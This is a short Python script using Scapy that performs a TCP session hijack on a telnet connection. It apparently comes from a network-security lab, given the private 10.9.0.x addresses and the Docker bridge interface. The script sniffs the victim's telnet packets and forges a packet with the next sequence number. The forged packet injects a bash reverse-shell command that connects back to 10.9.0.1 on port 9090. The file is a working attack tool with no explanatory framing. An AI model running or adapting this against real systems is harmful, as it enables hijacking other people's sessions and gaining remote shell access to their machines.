#!/usr/bin/env python3
from scapy.all import *

injected = False

def spoof(pkt):
    global injected
    if injected:                      # 已经注入过，直接跳过
        return
    if pkt[IP].src == "10.9.0.6" and pkt[TCP].dport == 23 and pkt[TCP].payload:
        ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
        tcp = TCP(
            sport=pkt[TCP].sport, dport=pkt[TCP].dport,
            flags="PA",
            seq=pkt[TCP].seq + len(pkt[TCP].payload),
            ack=pkt[TCP].ack
        )
        data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
        send(ip/tcp/data, verbose=0)
        injected = True
        print("[*] 注入完成")

sniff(iface="br-002a4cbca66a", filter="tcp port 23", prn=spoof)